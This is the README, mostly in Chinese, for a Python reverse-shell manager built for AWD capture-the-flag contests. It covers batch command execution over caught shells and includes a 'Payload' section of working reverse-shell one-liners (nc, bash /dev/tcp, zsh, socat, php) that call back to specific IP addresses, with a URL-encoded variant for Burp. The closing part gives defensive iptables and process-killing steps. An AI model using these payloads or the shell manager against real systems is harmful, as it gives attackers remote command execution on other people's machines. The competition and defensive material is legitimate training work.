##Tkitn\_reverse_manage
278884553@qq.com

###介绍
* awd线下shell管理与权限维持
* 批量执行命令，一键批量执行
* 交互式shell生成
* 异常处理，不会因为对方kill进程而意外退出，或命令输错等等原因导致程序卡死。测试还是蛮健壮的，能想到的bug都加了异常处理

###How to use
```
python3
python Tkitn_reverse_manage.py 0.0.0.0 9992
```
###参数
* h:列出帮助页面
* a:批量命令执行所有shell
* l:查看已经上线的所有shell
* g:根据ip进入其shell通道
* d:删除此shell节点
* r:刷新已经上线的shell,连接失败的则删除掉
* i:在当前的通道处生成交互式shell
* python -c 'import pty;pty.spawn("/bin/bash")'
* q:退出程序

###Payload

#### [**反弹shell集合**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

####常用的payload

```
nc -e /bin/bash 134.65.33.70 9991

bash -c 'bash -i >/dev/tcp/134.65.33.70/9991 0>&1'
burp里使用+代替空格
bash+-c+%27bash+-i+%3E%2Fdev%2Ftcp%2F134.65.33.70%2F9991+0%3E%261%27
zsh -c 'zmodload 

zsh/net/tcp && ztcp 134.65.33.70 9991 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:134.65.33.70:9991

php -r '$sock=fsockopen("192.168.43.220",9994);exec("/bin/sh -i <&3 >&3 2>&3");'
```

###防御反弹shell
kill进程

```
netstat -anp | grep ESTA
kill -9 pid
```
####防御
只开放一些比赛的必要端口，也可以防止后门的连接

```
#开放ssh
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
#打开80端口
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
#开启多端口简单用法
iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT
#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话
iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT
```
限制ssh登陆，进行访问控制

```
#禁止从xx.xx.xx.xx远程登陆到本机
iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp --dport 22 -j DROP
#允许xx.xx.xx.xx网段远程登陆访问ssh
iptables -A INPUT -s xx.xx.xx.1/24 -p tcp --dport 22 -j ACCEPT
```
限制IP连接数和连接速率

```
#单个IP的最大连接数为 30
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT
#单个IP在60秒内只允许最多新建15个连接
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT
#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）
iptables -A INPUT -p tcp --dport 80 -m limit --limit 2/s --limit-burst 10 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
```
限制访问

```
#禁止从客户机1.1.1.4访问1.1.1.5上的任何服务
iptable -t filter -A FORWARD -s 1.1.1.4 -d 1.1.1.5 -j DROP
#封杀1.1.1.4这个IP或者某个ip段
iptables -I INPUT -s 1.1.1.4 -j DROP
iptables -I INPUT -s 1.1.1.1/24 -j DROP
```

